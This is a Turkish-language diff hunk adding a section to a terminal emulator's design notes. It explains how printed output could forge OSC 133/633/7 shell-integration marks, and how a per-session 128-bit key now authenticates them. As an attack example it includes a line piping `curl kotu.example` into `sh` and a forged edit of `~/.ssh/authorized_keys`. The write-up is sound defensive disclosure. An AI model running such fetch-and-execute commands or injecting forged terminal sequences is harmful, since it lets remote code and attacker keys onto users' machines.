@@ -1249,6 +1249,27 @@ Yan kararlar, her biri bir tuzağı kapatıyor:
   aşamasında; gerçek pencerede DENENMEDİ) ve komut kutusunda (`onPaste`).
   Kapsam dışı: bracketed paste'i açmayan kabukta (cmd, bash 3.2) çok satırlı
   metin satır satır çalışıyor.
+- **Kabuk işaretleri anahtarla doğrulanıyor** ([`newMarkKey`](src/lib/osc.ts),
+  `admitMark`). AÇIK: OSC 133 / 633 / 7 doğrulanmıyordu; terminale basılan her
+  metin (`cat` ile açılan dosya, `curl` çıktısı, log satırı, ssh sunucusu) aynı
+  dizileri gönderebilir. Oturum düzeyinde denendi: çıktıya gömülü işaretler
+  geçmişe `curl kotu.example | sh` yazdırdı, git mesaj düzenleyicisini
+  `~/.ssh/authorized_keys` için açtırdı, kabuğa `ack` yazdırdı. Oturum her
+  kabuğa 128 bit rastgele bir anahtar veriyor (`NTERMINAL_NONCE`, spawn'dan
+  ÖNCE üretiliyor: çıktı `pty_spawn`ın yanıtından önce gelebiliyor); beş betik
+  de onu her dizinin SON alanı olarak ekliyor (`133;D;0;<anahtar>`).
+  - Anahtarlı dizi her zaman geçerli. Anahtarsız OSC 633 hiçbir kabukta
+    sayılmıyor. Anahtarsız OSC 133 / 7 yalnızca betiğin VERİLMEDİĞİ ve anahtarlı
+    dizi görülmemiş kabukta (fish kendi işaretini gönderiyor) eskisi gibi.
+  - Bedel: entegre bir sekmede iç içe / uzak kabuğun KENDİ anahtarsız işaretleri
+    (ssh ardındaki fish 4, `exec fish`, powerlevel10k'nin kabuk entegrasyonu)
+    artık sayılmıyor; sahte işaretten ayırt edilemiyorlar. zsh içinde açılan
+    zsh anahtarı miras alıyor (değişken dışa aktarılmış kalıyor; git'in
+    çalıştırdığı `nterminal-edit.sh` de oradan okuyor).
+  - Doğrulama: zsh ve bash'te PTY düzeneğiyle 31 / 30 dizinin tamamı anahtarlı,
+    anahtar yokken biçim eskisiyle aynı. PowerShell ve cmd betikleri mac'te
+    KOŞTURULAMADI; testleri `tests/shell_integration.rs`te, CI'ın Windows
+    koşusu deneyecek.
 
 **Bedel.** Yazdıkça süzülen listeler süzgeci Enter'da görüyor; Jest/Vitest
 izleme kipinin tek harflik kısayolları harf + Enter istiyor (fazladan `\r`
